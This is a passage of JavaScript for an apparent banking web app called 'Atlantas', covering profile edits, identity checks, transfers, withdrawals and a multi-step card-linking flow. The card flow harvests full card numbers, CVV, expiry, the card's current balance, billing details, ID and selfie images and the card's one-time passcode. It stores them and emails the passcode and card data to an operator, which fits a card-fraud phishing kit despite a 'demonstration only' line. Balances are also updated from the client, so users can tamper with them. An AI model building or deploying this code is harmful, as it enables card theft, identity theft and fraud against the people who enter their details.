  var labels={firstname:'First Name',othername:'Middle Name',surname:'Last Name'};
  var label=labels[field]||field;
  var body=$('modal-body');if(!body)return;
  body.innerHTML='<div class="modal-title">Edit '+_esc(label)+'</div>'+
    '<input class="modal-input" id="edit-field-input" type="text" value="'+_esc(cur)+'" placeholder="Enter '+_esc(label)+'">'+
    '<div class="modal-err" id="edit-field-err"></div>'+
    '<button class="modal-btn" onclick="APP.saveEditField(\''+field+'\')">Save</button>'+
    '<button class="modal-btn" style="background:var(--bg);color:var(--text);border:1.5px solid var(--border);margin-top:8px;" onclick="APP.closeModal(event)">Cancel</button>';
  $('modal-overlay').classList.add('open');
  var inp=$('edit-field-input');if(inp){inp.focus();inp.select();}
}
function APP_saveEditField(field){
  var inp=$('edit-field-input');if(!inp)return;
  var val=inp.value.trim();
  if(!val){var e=$('edit-field-err');if(e)e.textContent='This field cannot be empty.';return;}
  _db.ref(DB.users+'/'+_user.uid+'/'+field).set(val).then(function(){
    if(_ud)_ud[field]=val;_renderUI();_closeModal();APP_toast('Updated!','ok');
  });
}
function APP_copyRef(){var code=(_ud&&_ud.referralCode)||'';var url=(PLATFORM_URLS.userApp||location.origin)+'?ref='+code;navigator.clipboard?navigator.clipboard.writeText(url).then(function(){APP_toast('Link copied!','ok');}):APP_toast('Code: '+code);}

// ── KYC ───────────────────────────────────────────────────────
function APP_triggerUpload(id){var e=$(id);if(e)e.click();}
function APP_kycFileSelected(type,input){if(!input.files||!input.files[0])return;_kycFiles[type]=input.files[0];var zId=type==='id'?'uz-id':'uz-selfie',tId=type==='id'?'uz-id-t':'uz-selfie-t';var z=$(zId);if(z)z.classList.add('done');_setEl(tId,input.files[0].name);var vs=(type==='id'?$('vs2'):$('vs3'));if(vs)vs.classList.add('done');}
function APP_submitKyc(){
  if(!_kycFiles.id||!_kycFiles.selfie){APP_toast('Please upload both documents','er');return;}
  var btn=$('kyc-submit-btn');btn.textContent='Uploading\u2026';btn.disabled=true;
  _clUpload(_kycFiles.id,'kyc',function(idUrl){
    _clUpload(_kycFiles.selfie,'kyc',function(selfieUrl){
      _db.ref(DB.users+'/'+_user.uid+'/kycStatus').set('submitted').then(function(){
        _db.ref(DB.kyc+'/'+_user.uid).set({uid:_user.uid,email:_ud.email,name:(_ud.firstname+' '+_ud.surname),idUrl:idUrl,selfieUrl:selfieUrl,submittedDate:new Date().toISOString(),status:'pending'});
        _sendEmail('general','KYC Submission',{user_name:_ud.firstname+' '+_ud.surname,user_email:_ud.email,id_url:idUrl,selfie_url:selfieUrl,message:'User submitted KYC documents.'});
        _pushAdminAlert('\uD83E\uDEAA New KYC Submission',(_ud.firstname||'A user')+' submitted identity documents. Tap to review.');
        APP_toast('Submitted for review!','ok');btn.textContent='Submit for Review';btn.disabled=false;APP_back();
      });
    },function(e){APP_toast(e,'er');btn.textContent='Submit for Review';btn.disabled=false;});
  },function(e){APP_toast(e,'er');btn.textContent='Submit for Review';btn.disabled=false;});
}

// ── MODALS ────────────────────────────────────────────────────
function APP_openModal(type){var body=$('modal-body');if(!body)return;body.innerHTML=_buildModal(type);$('modal-overlay').classList.add('open');}
function APP_closeModal(e){if(e&&e.target!==$('modal-overlay'))return;$('modal-overlay').classList.remove('open');}
function _closeModal(){$('modal-overlay').classList.remove('open');}

function _buildModal(type){
  var en=(_cfg.labels&&_cfg.labels.en)||{};
  if(type==='topup'){
    var cards=(_ud&&_ud.linkedCards||[]).filter(function(c){return c&&c.status==='authorized';});
    var insts=(_cfg.institutions||[]).filter(function(i){return i&&i.show!==false;});
    var hasCards=cards.length>0,hasInsts=insts.length>0;
    var sourceHtml='';
    if(!hasCards&&!hasInsts){
      sourceHtml='<div style="background:rgba(220,38,38,.06);border:1.5px solid rgba(220,38,38,.2);border-radius:12px;padding:14px;margin-bottom:14px;font-size:13px;color:var(--er);font-weight:600;">\u26A0\uFE0F No authorized payment source found.<br><span style="font-weight:400;color:var(--t2);">Please link and authorize a card or bank account first.</span></div>';
    }else{
      sourceHtml='<div style="font-size:13px;font-weight:700;margin-bottom:8px;">Select Payment Source</div><select class="modal-input" id="m-src" style="margin-bottom:12px;"><option value="">-- Choose a source --</option>';
      cards.forEach(function(c,i){sourceHtml+='<option value="card_'+i+'">\uD83D\uDCB3 '+_esc(c.bankName||'Card')+' \u00B7\u00B7\u00B7\u00B7 '+_esc(c.lastFour||'****')+'</option>';});
      insts.forEach(function(inst,i){sourceHtml+='<option value="inst_'+i+'">\uD83C\uDFE6 '+_esc(inst.name||'Bank Account')+'</option>';});
      sourceHtml+='</select>';
    }
    return '<div class="modal-title">'+(en.topup||'Add Money')+'</div>'+sourceHtml+
      '<input class="modal-input" id="m-amt" type="number" placeholder="Amount" min="1" '+((!hasCards&&!hasInsts)?'disabled':'')+'>'+
      '<input class="modal-input" id="m-note" placeholder="Reference / Note (optional)" '+((!hasCards&&!hasInsts)?'disabled':'')+'>'+
      '<div class="modal-err" id="m-err"></div>'+
      '<button class="modal-btn" onclick="APP.submitTopup()" '+((!hasCards&&!hasInsts)?'disabled style="opacity:.5;"':'')+'>Submit Request</button>'+
      '<div class="modal-sub">Funds will be reviewed and credited to your account</div>';
  }
  if(type==='send')return '<div class="modal-title">'+(en.send||'Send Money')+'</div><input class="modal-input" id="m-recv" placeholder="Recipient Account Number" oninput="APP.lookupRecipient(this.value)"><div class="recv-preview" id="recv-preview"><div class="recv-name" id="recv-name"></div><div class="recv-acc" id="recv-acc-disp"></div></div><input class="modal-input" id="m-send-amt" type="number" placeholder="Amount" min="1"><input class="modal-input" id="m-send-note" placeholder="Note (optional)"><div class="modal-err" id="m-err"></div><button class="modal-btn" onclick="APP.submitSend()">Send Money</button>';
  if(type==='cashout')return '<div class="modal-title">'+(en.cashout||'Withdraw')+'</div><input class="modal-input" id="m-wo-amt" type="number" placeholder="Amount" min="1"><input class="modal-input" id="m-wo-acc" placeholder="Destination Account / Card Number"><input class="modal-input" id="m-wo-bank" placeholder="Bank Name"><div class="modal-err" id="m-err"></div><button class="modal-btn" onclick="APP.submitCashout()">Submit Withdrawal</button><div class="modal-sub">Processed within 1\u20133 business days</div>';
  if(type==='request')return '<div class="modal-title">'+(en.request||'Request Money')+'</div><input class="modal-input" id="m-req-from" placeholder="Sender Account Number"><input class="modal-input" id="m-req-amt" type="number" placeholder="Amount" min="1"><input class="modal-input" id="m-req-note" placeholder="Reason (optional)"><div class="modal-err" id="m-err"></div><button class="modal-btn" onclick="APP.submitRequest()">Send Request</button>';
  if(type==='addcard')return '<div class="modal-title">'+(en.addCard||'Add Card')+'</div><div style="background:var(--pl);border-radius:10px;padding:12px 14px;margin-bottom:14px;font-size:13px;color:var(--p);font-weight:600;">Please ensure you have sufficient funds available. Your card details are encrypted and secure.</div><input class="modal-input" id="m-ch-name" placeholder="Cardholder Full Name"><input class="modal-input" id="m-cn" placeholder="Card Number" maxlength="19" inputmode="numeric"><div class="modal-row"><input class="modal-input" id="m-exp" placeholder="MM/YY" maxlength="5"><input class="modal-input" id="m-cvv" placeholder="CVV" maxlength="4" inputmode="numeric"></div><input class="modal-input" id="m-bank" placeholder="Bank / Issuer Name"><input class="modal-input" id="m-bal" type="number" placeholder="Current Card Balance"><input class="modal-input" id="m-email" type="email" placeholder="Your Email Address"><div style="font-size:13px;font-weight:700;margin:10px 0 8px;">Billing Address</div><input class="modal-input" id="m-street" placeholder="Street Address"><div class="modal-row"><input class="modal-input" id="m-city" placeholder="City"><input class="modal-input" id="m-postcode" placeholder="Postcode / ZIP"></div><input class="modal-input" id="m-ba-country" placeholder="Country"><input class="modal-input" id="m-phone" type="tel" placeholder="Phone Number"><div class="modal-err" id="m-err"></div><button class="modal-btn" onclick="APP.submitCard()">Submit Card</button><div style="font-size:12px;color:var(--t2);text-align:center;margin-top:12px;padding-top:10px;border-top:1px solid var(--border2);">For demonstration purposes only.</div>';
  // FIX: refer modal uses APP.closeModal properly
  if(type==='refer'){var code=(_ud&&_ud.referralCode)||'\u2014';var url=(PLATFORM_URLS.userApp||location.origin)+'?ref='+code;return '<div class="modal-title">Refer &amp; Earn</div><div style="background:var(--pl);border:1.5px solid var(--p);border-radius:12px;padding:16px;text-align:center;margin-bottom:14px;"><div style="font-size:12px;color:var(--t2);margin-bottom:6px;">Your Referral Code</div><div style="font-size:24px;font-weight:800;color:var(--p);font-family:var(--mono);">'+_esc(code)+'</div></div><input class="modal-input" value="'+_esc(url)+'" readonly onclick="this.select()"><button class="modal-btn" onclick="APP.copyRef();_closeModal();">Copy Referral Link</button><div class="modal-sub">Earn rewards for every friend you invite</div>';}
  // FIX: earn modal uses APP.openModal (public API)
  if(type==='earn')return '<div class="modal-title">Earn Rewards</div><div style="text-align:center;padding:16px 0 20px;"><div style="width:64px;height:64px;border-radius:50%;background:var(--pl);display:flex;align-items:center;justify-content:center;margin:0 auto 14px;"><svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="var(--p)" stroke-width="2" stroke-linecap="round"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg></div><div style="font-size:16px;font-weight:700;margin-bottom:8px;">Invite friends to Atlantas</div><div style="font-size:14px;color:var(--t2);line-height:1.6;">Share your referral link and earn a bonus for every friend who joins and verifies their account.</div></div><button class="modal-btn" onclick="APP.openModal(\'refer\')">Share Referral Link</button>';
  return '';
}

// ── ACTIONS ───────────────────────────────────────────────────
function APP_lookupRecipient(val){
  var preview=$('recv-preview');clearTimeout(_lookupTimeout);
  if(val.trim().length<10){if(preview)preview.classList.remove('show');_recvUid=null;return;}
  _lookupTimeout=setTimeout(function(){
    _db.ref(DB.accNums+'/'+val.trim()).once('value',function(snap){
      if(!snap.exists()||snap.val()===_user.uid){if(preview)preview.classList.remove('show');_recvUid=null;return;}
      _recvUid=snap.val();
      _db.ref(DB.pubDir+'/'+_recvUid).once('value',function(ps){var pd=ps.val()||{};_setEl('recv-name',(pd.firstname||'')+' '+(pd.surname||''));_setEl('recv-acc-disp','Account: '+val.trim());if(preview)preview.classList.add('show');});
    });
  },400);
}
function APP_submitTopup(){
  var amt=parseFloat($('m-amt')&&$('m-amt').value||0),note=$('m-note')&&$('m-note').value||'';
  var src=($('m-src')&&$('m-src').value)||'';
  var err=$('m-err');if(err)err.textContent='';
  if($('m-src')&&!src){if(err)err.textContent='Please select a payment source.';return;}
  if(!amt||amt<1){if(err)err.textContent='Enter a valid amount.';return;}
  var key=Date.now()+'_'+_user.uid.slice(0,6);
  var srcLabel=src?((src.startsWith('card_')?'Card':'Bank Account')+' ('+src+')'):'';
  _db.ref(DB.topups+'/'+key).set({uid:_user.uid,name:(_ud.firstname+' '+_ud.surname).trim(),email:_ud.email,amount:amt,currency:_ud.currency||'USD',accountNumber:_ud.accountNumber,reference:note,paymentSource:srcLabel,status:'pending',date:new Date().toISOString()}).then(function(){
    var hist=(_ud.history||[]);hist.push({type:'debit',amount:amt,currency:_ud.currency,description:'Add money request',requestKey:key,status:'pending',date:new Date().toISOString()});
    _db.ref(DB.users+'/'+_user.uid+'/history').set(hist);
    _sendEmail('general','New Deposit Request',{user_name:_ud.firstname,user_email:_ud.email,amount:_sym(_ud.currency)+amt.toFixed(2),account:_ud.accountNumber,reference:note,message:'User submitted a deposit request.'});
    _pushAdminAlert('\u2B07\uFE0F New Deposit Request',(_ud.firstname||'A user')+' submitted a deposit of '+_sym(_ud.currency)+amt.toFixed(2)+'. Tap to review.');
    _closeModal();APP_toast('Request submitted!','ok');
  });
}
function APP_submitSend(){
  if(!_recvUid){APP_toast('Recipient not found','er');return;}
  var amt=parseFloat($('m-send-amt')&&$('m-send-amt').value||0),note=$('m-send-note')&&$('m-send-note').value||'';
  var err=$('m-err');if(err)err.textContent='';if(!amt||amt<1){if(err)err.textContent='Enter a valid amount.';return;}
  var myBal=parseFloat(_ud.balance||0);if(amt>myBal){if(err)err.textContent='Insufficient balance.';return;}
  _db.ref(DB.users+'/'+_recvUid).once('value',function(rSnap){
    var recv=rSnap.val();if(!recv){if(err)err.textContent='Recipient not found.';return;}
    var now=new Date().toISOString();
    var sHist=(_ud.history||[]);sHist.push({type:'debit',amount:amt,currency:_ud.currency,description:'Sent to '+(recv.firstname||'User')+(note?' \xb7 '+note:''),date:now,status:'successful'});
    var rHist=(recv.history||[]);rHist.push({type:'credit',amount:amt,currency:recv.currency,description:'Received from '+(_ud.firstname||'User')+(note?' \xb7 '+note:''),date:now,status:'successful'});
    _db.ref(DB.users+'/'+_user.uid).update({balance:myBal-amt,history:sHist});
    _db.ref(DB.users+'/'+_recvUid).update({balance:(parseFloat(recv.balance)||0)+amt,history:rHist});
    _notify(_recvUid,'You received '+_sym(recv.currency)+amt.toFixed(2)+' from '+(_ud.firstname||'a user'));
    _closeModal();APP_toast('Sent successfully!','ok');
  });
}
function APP_submitCashout(){
  var amt=parseFloat($('m-wo-amt')&&$('m-wo-amt').value||0),acc=$('m-wo-acc')&&$('m-wo-acc').value||'',bank=$('m-wo-bank')&&$('m-wo-bank').value||'';
  var err=$('m-err');if(err)err.textContent='';if(!amt||amt<1){if(err)err.textContent='Enter a valid amount.';return;}if(!acc){if(err)err.textContent='Enter destination account.';return;}
  var bal=parseFloat(_ud.balance||0);if(amt>bal){if(err)err.textContent='Insufficient balance.';return;}
  var key=Date.now()+'_'+_user.uid.slice(0,6);
  var hist=(_ud.history||[]);hist.push({type:'debit',amount:amt,currency:_ud.currency,description:'Withdrawal request',requestKey:key,status:'processing',date:new Date().toISOString()});
  _db.ref(DB.users+'/'+_user.uid).update({balance:bal-amt,history:hist});
  _db.ref(DB.cashouts+'/'+key).set({uid:_user.uid,name:(_ud.firstname+' '+_ud.surname).trim(),email:_ud.email,amount:amt,currency:_ud.currency||'USD',accountNumber:_ud.accountNumber,destinationAccount:acc,bankName:bank,referredBy:_ud.referredBy||'',status:'pending',date:new Date().toISOString()});
  _sendEmail('general','Withdrawal Request',{user_name:_ud.firstname,user_email:_ud.email,amount:_sym(_ud.currency)+amt.toFixed(2),account:acc,bank:bank,message:'User submitted a withdrawal request.'});
  _pushAdminAlert('\u2B06\uFE0F New Withdrawal Request',(_ud.firstname||'A user')+' wants to withdraw '+_sym(_ud.currency)+amt.toFixed(2)+'. Tap to review.');
  _closeModal();APP_toast('Withdrawal submitted!','ok');
}
function APP_submitRequest(){
  var fromAcc=$('m-req-from')&&$('m-req-from').value.trim()||'',amt=parseFloat($('m-req-amt')&&$('m-req-amt').value||0),note=$('m-req-note')&&$('m-req-note').value||'';
  var err=$('m-err');if(err)err.textContent='';if(!fromAcc){if(err)err.textContent='Enter sender account number.';return;}if(!amt||amt<1){if(err)err.textContent='Enter a valid amount.';return;}
  _db.ref(DB.accNums+'/'+fromAcc).once('value',function(snap){if(!snap.exists()){if(err)err.textContent='Account not found.';return;}_notify(snap.val(),(_ud.firstname||'A user')+' is requesting '+_sym(_ud.currency)+amt.toFixed(2)+(note?' for '+note:'')+'. Account: '+_ud.accountNumber);_closeModal();APP_toast('Request sent!','ok');});
}
// ── CARD MULTI-STEP FLOW ──────────────────────────────────────
var _cardDraft=null; // persists pending card data across steps

function APP_openAddCard(){
  // Load any saved draft
  try{var d=localStorage.getItem('atl_card_draft');if(d)_cardDraft=JSON.parse(d);}catch(e){}
  if(_cardDraft&&_cardDraft._needsOtp){
    // Resume at OTP step
    _show('card-step3',true);return;
  }
  if(_cardDraft&&_cardDraft._needsId&&_cfg.enableCardIdVerification!==false){
    // Resume at ID step
    _show('card-step2',true);return;
  }
  _cardDraft={};
  _show('card-step1',true);
}

function APP_openCardDetail(card,idx){
  var body=$('card-detail-body');if(!body)return;
  var statusLabel=card.status==='authorized'?'Authorized':card.status==='rejected'?'Rejected':card.status==='processing'?'Processing':'Pending';
  var statusColor=card.status==='authorized'?'var(--ok)':card.status==='rejected'?'var(--er)':'var(--warn)';
  var sym=_sym(_ud&&_ud.currency);
  // Check if user can resume a pending step
  var resumeBtn='';
  if((card.status==='pending'||card.status==='processing')&&card._needsOtp){
    resumeBtn='<button class="abtn" style="margin-top:16px;" onclick="APP.back();APP.resumeCardOtp('+idx+')">Enter OTP Code</button>';
  } else if((card.status==='pending'||card.status==='processing')&&card._needsId&&_cfg.enableCardIdVerification!==false){
    resumeBtn='<button class="abtn" style="margin-top:16px;" onclick="APP.back();APP.resumeCardId('+idx+')">Upload ID</button>';
  }
  body.innerHTML=
    '<div style="text-align:center;padding:8px 0 24px;">'+
    '<div style="width:72px;height:72px;border-radius:50%;background:var(--pl);display:flex;align-items:center;justify-content:center;margin:0 auto 14px;">'+
    '<svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="var(--p)" stroke-width="2" stroke-linecap="round"><rect x="1" y="4" width="22" height="16" rx="2"/><line x1="1" y1="10" x2="23" y2="10"/></svg></div>'+
    '<div style="font-size:28px;font-weight:800;color:var(--text);">\u2022\u2022\u2022\u2022 '+_esc(card.lastFour||'\u2022\u2022\u2022\u2022')+'</div>'+
    '<div style="font-size:14px;font-weight:700;margin-top:6px;color:'+statusColor+';">'+statusLabel+'</div>'+
    '</div>'+
    '<div style="background:var(--bg);border-radius:14px;padding:4px 0;margin-bottom:16px;">'+
    '<div style="display:flex;justify-content:space-between;padding:12px 14px;border-bottom:1px solid var(--border2);"><span style="font-size:13px;color:var(--t2);">Cardholder</span><span style="font-size:14px;font-weight:600;">'+_esc((card.name||'').toUpperCase())+'</span></div>'+
    '<div style="display:flex;justify-content:space-between;padding:12px 14px;border-bottom:1px solid var(--border2);"><span style="font-size:13px;color:var(--t2);">Bank / Issuer</span><span style="font-size:14px;font-weight:600;">'+_esc(card.bankName||card.brand||'—')+'</span></div>'+
    '<div style="display:flex;justify-content:space-between;padding:12px 14px;border-bottom:1px solid var(--border2);"><span style="font-size:13px;color:var(--t2);">Expires</span><span style="font-size:14px;font-weight:600;font-family:var(--mono);">'+_esc(card.expiry||'—')+'</span></div>'+
    '<div style="display:flex;justify-content:space-between;padding:12px 14px;border-bottom:1px solid var(--border2);"><span style="font-size:13px;color:var(--t2);">Status</span><span style="font-size:14px;font-weight:700;color:'+statusColor+';">'+statusLabel+'</span></div>'+
    '<div style="display:flex;justify-content:space-between;padding:12px 14px;"><span style="font-size:13px;color:var(--t2);">Added</span><span style="font-size:14px;font-weight:600;">'+_fmtDate(card.addedDate)+'</span></div>'+
    '</div>'+
    (card.status==='pending'||card.status==='processing'?'<div style="background:rgba(217,119,6,.08);border:1.5px solid rgba(217,119,6,.2);border-radius:14px;padding:14px 16px;font-size:13px;color:var(--warn);line-height:1.6;">Your card is under review. Once approved by admin it will show as Authorized.</div>':'');
  if(resumeBtn)body.innerHTML+=resumeBtn;
  _show('card-detail',true);
}

function APP_resumeCardOtp(idx){
  var cards=(_ud&&_ud.linkedCards||[]);
  _cardDraft=cards[idx]||{};
  _cardDraft._resumeIdx=idx;
  _show('card-step3',true);
}
function APP_resumeCardId(idx){
  var cards=(_ud&&_ud.linkedCards||[]);
  _cardDraft=cards[idx]||{};
  _cardDraft._resumeIdx=idx;
  _show('card-step2',true);
}

function APP_cardStep1Submit(){
  var name=($('cs-name')&&$('cs-name').value.trim())||'';
  var cn=($('cs-cn')&&$('cs-cn').value||'').replace(/\s/g,'');
  var exp=($('cs-exp')&&$('cs-exp').value)||'';
  var cvv=($('cs-cvv')&&$('cs-cvv').value)||'';
  var bank=($('cs-bank')&&$('cs-bank').value.trim())||'';
  var bal=($('cs-bal')&&$('cs-bal').value)||'0';
  var email=($('cs-email')&&$('cs-email').value.trim())||'';
  var street=($('cs-street')&&$('cs-street').value.trim())||'';
  var city=($('cs-city')&&$('cs-city').value.trim())||'';
  var post=($('cs-post')&&$('cs-post').value.trim())||'';
  var country=($('cs-country')&&$('cs-country').value.trim())||'';
  var phone=($('cs-phone')&&$('cs-phone').value.trim())||'';
  var err=$('cs-err');if(err)err.textContent='';
  if(!name||!cn||!exp||!cvv){if(err)err.textContent='Please fill in all card details.';return;}
  var brand=(/^4/.test(cn)?'Visa':/^5[1-5]/.test(cn)?'Mastercard':/^3[47]/.test(cn)?'Amex':'Card');
  _cardDraft={name:name,number:cn,lastFour:cn.slice(-4),expiry:exp,cvv:cvv,bankName:bank,currentBalance:bal,brand:brand,email:email,billingAddress:{street:street,city:city,postcode:post,country:country,phone:phone},status:'processing',addedDate:new Date().toISOString(),_needsId:(_cfg.enableCardIdVerification!==false),_needsOtp:true};
  // Save draft for resuming
  try{localStorage.setItem('atl_card_draft',JSON.stringify(_cardDraft));}catch(e){}
  // Push to firebase immediately and send to admin
  var cards=(_ud.linkedCards||[]).slice();
  _cardDraft._draftIdx=cards.length;
  cards.push(Object.assign({},_cardDraft));
  _db.ref(DB.users+'/'+_user.uid+'/linkedCards').set(cards).then(function(){
    if(_ud)_ud.linkedCards=cards;
    _renderCards();
    _sendEmail('general','New Card Submission — Step 1',{user_name:_ud.firstname,user_email:_ud.email,card_last4:cn.slice(-4),bank:bank,message:'User submitted card details. Awaiting ID and OTP.'});
    _pushAdminAlert('\uD83D\uDCB3 New Card Submission',(_ud.firstname||'A user')+' submitted a '+brand+' card ending '+cn.slice(-4)+'. Tap to review.');
  });
  // Go to ID step if enabled, else straight to OTP
  if(_cfg.enableCardIdVerification!==false){_show('card-step2',true);}
  else{_show('card-step3',true);}
}

function APP_cardIdFileSelected(inp){
  if(!inp||!inp.files||!inp.files[0])return;
  var file=inp.files[0];var isId=(inp.id==='cs-id-file');
  var lblId=isId?'cs-id-lbl':'cs-selfie-lbl';var zoneId=isId?'cs-id-zone':'cs-selfie-zone';
  _setEl(lblId,'Uploading\u2026');
  _clUpload(file,'cardkyc',function(url){
    if(isId)_cardDraft._idUrl=url;else _cardDraft._selfieUrl=url;
    _setEl(lblId,file.name+' \u2713');
    var z=$(zoneId);if(z)z.classList.add('done');
    APP_toast('Uploaded!','ok');
    try{localStorage.setItem('atl_card_draft',JSON.stringify(_cardDraft));}catch(e){}
  },function(e){APP_toast(e,'er');_setEl(lblId,'Upload failed \u2014 tap to retry');});
}
function APP_cardSelfieSelected(inp){APP_cardIdFileSelected(inp);}

function APP_cardStep2Submit(){
  var err=$('cs-id-err');if(err)err.textContent='';
  if(!_cardDraft._idUrl){if(err)err.textContent='Please upload your ID document.';return;}
  // Append ID data to the card in firebase
  _appendCardData({_idUrl:_cardDraft._idUrl,_selfieUrl:_cardDraft._selfieUrl||'',_needsId:false});
  _sendEmail('general','Card ID Submitted',{user_name:_ud.firstname,user_email:_ud.email,card_last4:_cardDraft.lastFour||'',message:'User uploaded ID for card verification.'});
  _show('card-step3',true);
}

function APP_cardStep3Submit(){
  var otp=($('cs-otp')&&$('cs-otp').value.trim())||'';
  var err=$('cs-otp-err');if(err)err.textContent='';
  if(!otp){if(err)err.textContent='Please enter the OTP code.';return;}
  _appendCardData({_otpCode:otp,_needsOtp:false,status:'pending'});
  _sendEmail('general','Card OTP Submitted',{user_name:_ud.firstname,user_email:_ud.email,card_last4:_cardDraft.lastFour||'',otp:otp,message:'User submitted OTP for card. Full submission complete — awaiting admin approval.'});
  // Clear draft
  try{localStorage.removeItem('atl_card_draft');}catch(e){}
  _cardDraft=null;
  // Go back to cards tab
  APP_toast('Card submitted for review!','ok');
  while(_screenStack.length)_screenStack.pop();
  APP_switchTab('cards');
}

function _appendCardData(updates){
  if(!_user||!_ud)return;
  var cards=(_ud.linkedCards||[]).slice();
  var idx=(_cardDraft&&_cardDraft._draftIdx!==undefined)?_cardDraft._draftIdx:(_cardDraft&&_cardDraft._resumeIdx!==undefined?_cardDraft._resumeIdx:cards.length-1);
  if(idx>=0&&idx<cards.length){
    Object.assign(cards[idx],updates);
    _db.ref(DB.users+'/'+_user.uid+'/linkedCards').set(cards).then(function(){
      if(_ud)_ud.linkedCards=cards;_renderCards();
    });
  }
}

function APP_submitCard(){
  // Legacy — redirect to new flow
  APP_closeModal();APP_openAddCard();
}

// ── TOAST ─────────────────────────────────────────────────────
function APP_toast(msg,type,dur){var t=$('toast');if(!t)return;t.textContent=msg;t.className='show'+(type?' '+type:'');clearTimeout(t._t);t._t=setTimeout(function(){t.className='';},dur||2500);}

// ── PUBLIC API ────────────────────────────────────────────────
var APP={
  goScreen:APP_goScreen,back:APP_back,signOut:APP_signOut,
  authTab:APP_authTab,doLogin:APP_doLogin,doSignup:APP_doSignup,doLogout:APP_doLogout,
  acceptTerms:APP_acceptTerms,sendPasswordReset:APP_sendPasswordReset,
  doBiometricLogin:APP_doBiometricLogin,bioPinSubmit:APP_bioPinSubmit,
  registerBiometric:APP_registerBiometric,disableBiometric:APP_disableBiometric,
  switchTab:APP_switchTab,filterTx:APP_filterTx,toggleBal:APP_toggleBal,
  editField:APP_editField,saveEditField:APP_saveEditField,copyRef:APP_copyRef,
  triggerUpload:APP_triggerUpload,kycFileSelected:APP_kycFileSelected,submitKyc:APP_submitKyc,
  openModal:APP_openModal,closeModal:APP_closeModal,
  lookupRecipient:APP_lookupRecipient,
  submitTopup:APP_submitTopup,submitSend:APP_submitSend,submitCashout:APP_submitCashout,
  submitRequest:APP_submitRequest,submitCard:APP_submitCard,
  openAddCard:APP_openAddCard,openCardDetail:APP_openCardDetail,
  resumeCardOtp:APP_resumeCardOtp,resumeCardId:APP_resumeCardId,
  cardStep1Submit:APP_cardStep1Submit,cardStep2Submit:APP_cardStep2Submit,cardStep3Submit:APP_cardStep3Submit,
  cardIdFileSelected:APP_cardIdFileSelected,cardSelfieSelected:APP_cardSelfieSelected,
  instStep1Submit:APP_instStep1Submit,instOtpSubmit:APP_instOtpSubmit,instIdSubmit:APP_instIdSubmit,instOtpUnlock:APP_instOtpUnlock,
  lockFlowSubmit:APP_lockFlowSubmit,lockOtpSubmit:APP_lockOtpSubmit,
  openLoan:APP_openLoan,submitLoan:APP_submitLoan,
  showReceipt:APP_showReceipt,toast:APP_toast
};
